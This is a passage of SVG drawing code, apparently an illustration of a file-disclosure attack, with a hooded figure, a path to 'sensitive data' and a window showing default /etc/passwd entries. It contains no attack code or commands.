y2="270.68" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.86"/><line x1="168.83" y1="273.25" x2="173.69" y2="273.33" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.86"/><line x1="168.38" y1="275.9" x2="173.25" y2="275.98" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.86"/><line x1="167.86" y1="278.55" x2="172.73" y2="278.63" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.86"/><line x1="167.28" y1="281.2" x2="172.15" y2="281.28" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.86"/><polygon points="220.18 241.11 221.97 212.32 228.58 202.81 215.85 193.96 209.24 203.48 185.03 218.56 220.18 241.11" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="208.78" y1="203.37" x2="222.13" y2="212.64" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="240.54 305.45 236.72 304.15 261.17 227.87 264.99 229.17 240.54 305.45" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><circle cx="262.4" cy="231.38" r="6" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><circle cx="238.61" cy="304.34" r="2.94" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><rect x="222.6" y="310.45" width="28.72" height="3.79" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="194.69" y1="264.82" x2="198.76" y2="264.85" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.86"/><line x1="187.11" y1="264.78" x2="191.14" y2="264.8" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.86"/><line x1="179.56" y1="264.73" x2="183.54" y2="264.76" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="0.86"/><line x1="178.13" y1="270.85" x2="199.35" y2="271.12" fill="#fff" stroke="silver" stroke-miterlimit="10" stroke-width="2"/><line x1="177.41" y1="274.21" x2="191.28" y2="274.42" fill="#fff" stroke="silver" stroke-miterlimit="10" stroke-width="2"/><line x1="176.87" y1="277.43" x2="205.26" y2="277.87" fill="#fff" stroke="silver" stroke-miterlimit="10" stroke-width="2"/><line x1="176.44" y1="280.85" x2="197.66" y2="281.11" fill="#fff" stroke="silver" stroke-miterlimit="10" stroke-width="2"/><line x1="175.72" y1="284.21" x2="189.59" y2="284.42" fill="#fff" stroke="silver" stroke-miterlimit="10" stroke-width="2"/><line x1="175.18" y1="287.42" x2="203.57" y2="287.87" fill="#fff" stroke="silver" stroke-miterlimit="10" stroke-width="2"/><line x1="174.58" y1="290.84" x2="195.8" y2="291.11" fill="#fff" stroke="silver" stroke-miterlimit="10" stroke-width="2"/><line x1="173.85" y1="294.21" x2="187.72" y2="294.41" fill="#fff" stroke="silver" stroke-miterlimit="10" stroke-width="2"/><path d="M83.72,239a29.18,29.18,0,0,0,10.94-.27c10.07-1.82,16.26-16.36,23-23.78,2.12-2.33,1.62-1.68,2.82-3.06.49-.47.54-.47.82-.43a3.17,3.17,0,0,1,2.2,1.52,22,22,0,0,1,2.13,6.56.2.2,0,0,0,.4,0c.71-7.56-.44-9.55-.44-10.82,0-.19,4-7.07,4.45-8.26a20.74,20.74,0,0,0,1.1-4.92c.75-6.56-.55-12.08-5.27-16.85a2.67,2.67,0,0,1-.73-1.48h0a25.27,25.27,0,0,0-1.29-6.42,18.72,18.72,0,0,0-5.89-8.43c-4.35-3.55-10.7-4.45-14.53-4.58,2.42,1.61,7.17,4.27,8.22,10.82C100,159.51,91.92,155,84.31,156.09a20.48,20.48,0,0,1,11.76,13.33c-2.8-1.48-5.44-3.25-9.71-4.45-3.79-1.06-9.38-2.44-12.81-.51,3.2.2,8.46,2.74,11,8.58a22.8,22.8,0,0,0-15,.72c-4.42,1.61-11.1,8.9-11.92,13.53.94-.81,5.36-4.35,10.5-2.62a19.13,19.13,0,0,0-7.52,12.05,25.3,25.3,0,0,0,.46,9.37C63.28,216.56,72.47,236.61,83.72,239Z" fill="#4c5054"/><path d="M61.12,194.26s-3.25,12-.2,19.9,4.78,5.38,4.78,5.38-1.88,3,2.35,8.66c2.24,3,10.29,9.78,14.16,10.6s11-4.08,11.11-6.42-1.63-11.21-3.77-15.09-5.09-8.25-6.83-9.17S68,199.66,68,199.25,61.12,194.26,61.12,194.26Z" fill="#4c5054"/><path d="M129.38,268.23l-11.81,3.86a10.85,10.85,0,0,1-4.08.48H65.92" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="9.51"/><path d="M137,286.5l-14.36,5.74a15.15,15.15,0,0,1-4.75,1h-61" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="9.51"/><line x1="121.17" y1="312.1" x2="56.92" y2="312.13" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="9.51"/><line x1="121.08" y1="330.36" x2="57.13" y2="331.28" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="9.51"/><path d="M29.76,289.48a2.32,2.32,0,0,0,2,1.39c2.53.23,9.76,2.47,12.22,20.37,3,21.83,2.81,32.22,1.34,37-2,6.46-4.07,6.14-5.71,7.83a2.24,2.24,0,0,0,.34,3.66H88.16s14.48-2.83,9.14-37-7.12-34.54-17.33-36c-1.08-.15-41.93-.31-48.2-.33a2,2,0,0,0-1.58.8A2.37,2.37,0,0,0,29.76,289.48Z" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M85.63,355.8s13-2.28,7.65-33.48-6.16-30.46-16.37-31.79" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M86.16,359.78a2.08,2.08,0,0,1-2.08-2,2,2,0,0,1,2-2.05" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="30.25" y1="290.58" x2="77.75" y2="290.76" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="85.52" y1="355.87" x2="39.46" y2="355.87" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M78.2,290.75a2,2,0,1,1,0-4.06" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M66,277.68H63.27l2-5.74a22.37,22.37,0,0,0,.31,2.26C65.7,274.36,66,277.68,66,277.68Z" fill="#4c5054"/><g clip-path="url(#a)"><line x1="148.83" y1="292.13" x2="130.83" y2="317.3" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="9.51"/><line x1="159.97" y1="293.27" x2="159.68" y2="319.65" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="9.51"/></g><path d="M138.83,290.88l3.47,7.55h31.1v16.43H139.82s-7.5-.4-11.29-7a69.86,69.86,0,0,1-5.18-10.76Z" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polyline points="338.66 52.17 305.45 52.17 305.45 24.5 166.18 24.5 166.18 75.81 223.65 75.81 223.65 37.6 143.07 37.6 143.07 111.15 180.21 111.15 180.21 167.04 208.41 167.04 208.41 138.11 168.61 138.11 168.61 251.64" fill="none" stroke="#cbd0d1" stroke-miterlimit="10"/><polygon points="332.96 46.45 341.96 52.45 332.96 58.45 332.96 46.45" fill="#cbd0d1"/><polygon points="137.3 88.36 143.3 79.45 149.3 88.36 137.3 88.36" fill="#cbd0d1"/><polygon points="162.97 195.6 168.97 186.69 174.97 195.6 162.97 195.6" fill="#cbd0d1"/><polyline points="233.6 376.77 233.6 416.98 215.76 416.98 215.76 390.62 269.23 390.62 269.23 406.84 324.45 406.84 324.45 381.63 352.08 381.63" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="5"/><polyline points="233.6 376.77 233.6 416.98 215.76 416.98 215.76 390.62 269.23 390.62 269.23 406.84 324.45 406.84 324.45 381.63 352.08 381.63" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="233.7 352.73 233.7 342.66 326.14 342.66 326.14 245.94 278.22 245.94 278.22 298.88 315.24 298.88 315.24 273.15 229.82 273.15" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="5"/><polyline points="233.7 352.73 233.7 342.66 326.14 342.66 326.14 245.94 278.22 245.94 278.22 298.88 315.24 298.88 315.24 273.15 235.82 273.15" fill="none" stroke="#d60000" stroke-miterlimit="10"/><rect x="195.32" y="352.5" width="131.36" height="24.27" rx="11.43" fill="#edd6d6" stroke="#d60000" stroke-miterlimit="10"/><text transform="translate(222.93 368.91)" font-size="14" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700" style="isolation:isolate">sensitive data</text><path d="M211.08,358.62,210.6,363l4.41-1.23.39,3-4,.29,2.63,3.5L211.35,370l-1.84-3.69-1.62,3.67-2.79-1.41,2.61-3.5-4-.31.46-3,4.31,1.23L208,358.6Z" fill="#d60000"/><polygon points="285.15 413.03 276.37 407.08 285.15 401.04 285.15 413.03" fill="#d60000"/><polygon points="320.14 316.53 326.09 307.75 332.13 316.53 320.14 316.53" fill="#d60000"/><polygon points="237.46 278.9 228.68 272.95 237.46 266.91 237.46 278.9" fill="#d60000"/><text transform="translate(416.08 221.41)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">root:x:0:0:root:/root:/bin/bash</text><text transform="translate(416.08 235.23)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</text><text transform="translate(416.08 249.05)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">bin:x:2:2:bin:/bin:/bin/sh</text><text transform="translate(416.08 262.87)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">sys:x:3:3:sys:/dev:/bin/sh</text><text transform="translate(416.08 276.68)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">sync:x:4:65534:sync:/bin:/bin/sync</text><text transform="translate(416.08 290.5)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">games:x:5:60:games:/usr/games:/bin/sh</text><text transform="translate(416.08 304.31)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">man:x:6:12:man:/var/cache/man:/bin/sh</text><text transform="translate(416.08 318.14)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</text><text transform="translate(416.08 331.95)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">mail:x:8:8:mail:/var/mail:/bin/sh</text><text transform="translate(416.08 345.77)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">news:x:9:9:news:/var/spool/news:/bin/sh</text><text transform="translate(416.08 359.58)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</text><text transform="translate(416.08 373.4)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">proxy:x:13:13:proxy:/bin:/bin/sh</text><text transform="translate(416.08 387.23)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">www-data:x:33:33:www-data:/var/www:/bin/sh</text><text transform="translate(416.08 401.04)" font-size="12" fill="#4c5054" font-family="Courier-Bold, Courier" font-weight="700" style="isolation:isolate">backup:x:34:34:backup:/var/backups:/bin/sh</text><rect x="352.97" y="196.56" width="45.56" height="223.72" fill="#edd6d6"/><circle cx="366.18" cy="181.96" r="3.2" fill="#fff"/><circle cx="376.16" cy="181.96" r="3.2" fill="#fff"/><circle cx="386.42" cy="181.96" r="3.2" fill="#fff"/><line x1="362.09" y1="213.84" x2="388.55" y2="213.84" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="2"/><line x1="362.09" y1="224.69" x2="388.55" y2="224.69" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="2"/><line x1="362.09" y1="235.54" x2="388.55" y2="235.54" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="2"/><line x1="362.09" y1="246.4" x2="388.55" y2="246.4" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="2"/><line x1="362.09" y1="257.25" x2="388.55" y2="257.25" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="2"/><rect x="539.44" y="-19.03" width="28.58" height="403.3" transform="translate(736.35 -371.11) rotate(90)" fill="#d60000"/><circle cx="365.73" cy="182.41" r="3.2" fill="#fff"/><circle cx="375.72" cy="182.41" r="3.2" fill="#fff"/><circle cx="385.97" cy="182.41" r="3.2" fill="#fff"/><line x1="410.92" y1="183.11" x2="445.23" y2="183.11" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="2"/><line x1="455.82" y1="183.11" x2="490.13" y2="183.11" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="2"/><line x1="500.72" y1="183.11" x2="535.02" y2="183.11" fill="none" stroke="#fff" stroke-miterlimit="10" stroke-width="2"/><rect x="352.29" y="168.15" width="403.22" height="253.16" fill="none" stroke="#d60000" stroke-miterlimit="10"/><rect x="352.29" y="15.03" width="403.22" height="131.83" fill="none" stroke="#70d16d" stroke-miterlimit="10"/><path d="M291.91,132.81a3.56,3.56,0,0,0-2.15-3.51,12.62,12.62,0,0,0-2.39.21s-1.08.17-2,.37-1.12.91-.75,2.89a4.3,4.3,0,0,0,4.59,3.18C291.25,135.75,291.66,134.55,291.91,132.81Z" fill="#fff"/><path d="M283.6,134.79s-1.23.26-1.53,2.47-.36,3-.14,3,.69-.74,1-1.15.43-.66.77-.66,1.1,1.19,1.34,1.43.15.26.38.23,0-2.32-.42-3.5S284.08,134.79,283.6,134.79Z" fill="#fff"/><path d="M302.76,142.8c-1.14-.91-3.94-.63-5.9-1-1.8-.36-6-1.8-6.68-2a1.58,1.58,0,0,1,.44-.48A11.41,11.41,0,0,0,293,137l2.46-.87a28.54,28.54,0,0,1,5.74-1.47,2.43,2.43,0,0,0,2.22-2.07,1.54,1.54,0,0,0-.76-1.49,6.71,6.71,0,0,0,0-.74,1.5,1.5,0,0,0-.67-1.2,1.93,1.93,0,0,0-2.35.12,17,17,0,0,1-2.76,2.22c-.57.33-2.07,1-2.89,1.39a12.48,12.48,0,0,1,.31-2.85,43.75,43.75,0,0,0,1.22-5.58c.25-2.09.25-4.1-2.75-5.73a16.72,16.72,0,0,0-10.33-2.2l-.33,0c-1.86.1-4.84.5-6.76,1.92-3,2.18-3.54,3.84-3.36,6s1,5.75,1.13,6.85a15.94,15.94,0,0,1,.07,1.74c-.83-.37-2.28-1-2.84-1.37a11.17,11.17,0,0,1-2.22-1.89,1.93,1.93,0,0,0-2.35-.11,1.53,1.53,0,0,0-.68,1.19c0,.46,0,.74,0,.74a1.55,1.55,0,0,0-.77,1.49,2.43,2.43,0,0,0,2.23,2.07,20.83,20.83,0,0,1,5.2,1.15c2.07.72,2.47.87,2.55.9a6.13,6.13,0,0,0,2.29,2.14,3.93,3.93,0,0,1,1.05.81A59.76,59.76,0,0,1,271,142.5c-2,.39-4.37.09-5.51,1a1.93,1.93,0,0,0-.74,2.48,1.81,1.81,0,0,0,1,1.26l.3.12a2,2,0,0,0,.79,2c1.07.68,2,.85,3.35-.8a14.79,14.79,0,0,1,5.51-3.88c1.83-.82,3.12-1.38,3.54-1.56a6.09,6.09,0,0,0,3.9,1.52h.49c1,0,3.36-.12,4.59-1.53.14-.16.26-.33.39-.49.41.18,1.7.74,3.53,1.56a14.69,14.69,0,0,1,5.51,3.89c1.35,1.64,2.57,1.57,3.63.88a1.69,1.69,0,0,0,.52-2s0-.06.29-.18a2,2,0,0,0,1.33-1.22A2.19,2.19,0,0,0,302.76,142.8ZM294,133.51s2.66-1.17,3.3-1.54a9.84,9.84,0,0,0,2.3-1.9,1.51,1.51,0,0,1,2-.26,1.77,1.77,0,0,1,.4,1.24,3.5,3.5,0,0,1-.56,1.14,2.55,2.55,0,0,0,.6-.73,1,1,0,0,1,.62,1.21c-.15.62-.38,1-2.57,1.38a28.63,28.63,0,0,0-5.34,1.61l-1.28.47s0-.12.09-.29a4,4,0,0,0,.27-1,4.26,4.26,0,0,0,.1-.61C294,133.59,294,133.51,294,133.51Zm-21.59,2.37a30,30,0,0,0-5.36-1.41c-2.19-.35-2.05-.65-2.2-1.27a.94.94,0,0,1,.66-1.17,2.48,2.48,0,0,0,.59.72,3.6,3.6,0,0,1-.56-1.14,1.73,1.73,0,0,1,.4-1.23,1,1,0,0,1,1.66-.09,9.64,9.64,0,0,0,2.3,1.9c.6.34,3,1.39,3.27,1.52V134c0,.12,0,.27.06.43v0a10.29,10.29,0,0,0,.46,1.91Zm.78,9.17a11.64,11.64,0,0,0-3.68,3c-.71.75-1.82,1.45-2.81.44s.26-2.56.22-2.54a3.46,3.46,0,0,0-.66.78,2,2,0,0,1-.81-.52,1.68,1.68,0,0,1,0-2.07c.48-.71,2.12-.8,5-1.17a31.89,31.89,0,0,0,7.32-2.53s.18.41.36.77.65,1.21.65,1.21S275.34,143.92,273.18,145.05Zm14.6-4.16-.07.08c-.11,0-.2,0-.18.2a1.27,1.27,0,0,1-.38,1.29c-.45.33-.53-.61-.53-.61l-.08,0s.14.94-.28,1.06-.36-.86-.36-.86h-.14s.27,1.11-.35,1.28-.44-1.13-.44-1.13h-.26s.34,1.37-.54,1.4-.57-1.31-.57-1.31h-.35s.34,1.35-.57,1.37-.55-1.4-.55-1.4h-.34s.16,1.19-.4,1.2-.4-1.34-.4-1.34h-.12s0,.3-.09.6-.34.42-.49.21a2.44,2.44,0,0,1-.1-1h-.06s0,0,0,.25-.1.52-.47.47-.35-1-.36-1.38c0-.08,0-.13,0-.13s-.6-1-.93-1.71-.95-.68-2-1.18-2.47-1.11-2.6-4.62a.87.87,0,0,0,0-.11v-.16h0c0-.35,0-.72,0-1.12.08-1.36,1.33-3,1.46-5.65s-.53-3-.63-2.83-.55,3.33-.8,4.64a10.13,10.13,0,0,1-.55,2s-1.46-6-.26-7.78a10.3,10.3,0,0,1,4.7-4.14,29.94,29.94,0,0,1,5.25-1.18,16.36,16.36,0,0,1,5.29.73c2.89.94,6.06,3.8,6.14,5.56a13.93,13.93,0,0,1-.55,4.51c-.44,1.93-.58,2.56-.58,2.56s-1.4-5.58-1.57-6.33-.66-.8-.8.06a8.84,8.84,0,0,0,.75,4.7c.91,2.12,1.79,3.91,1.24,6s-2.26,2.92-3.44,3.69A5.11,5.11,0,0,0,287.78,140.89Zm14.56,4.85a2,2,0,0,1-.81.51,3.69,3.69,0,0,0-.66-.78s1.22,1.54.22,2.55-2.1.3-2.81-.45a11.78,11.78,0,0,0-3.68-3c-2.1-1.09-5.39-2.54-5.56-2.62a15,15,0,0,0,.81-1.57,43.34,43.34,0,0,0,7.5,2.11c2.88.37,4.52.46,5,1.18A1.68,1.68,0,0,1,302.34,145.74Z" fill="#fff"/><path d="M281.64,129.88c-.9-.2-2-.37-2-.37a12.62,12.62,0,0,0-2.39-.21,3.57,3.57,0,0,0-2.15,3.51c.25,1.74.66,2.94,2.68,3.14a4.3,4.3,0,0,0,4.59-3.18C282.76,130.79,282.55,130.09,281.64,129.88Z" fill="#fff"/></svg>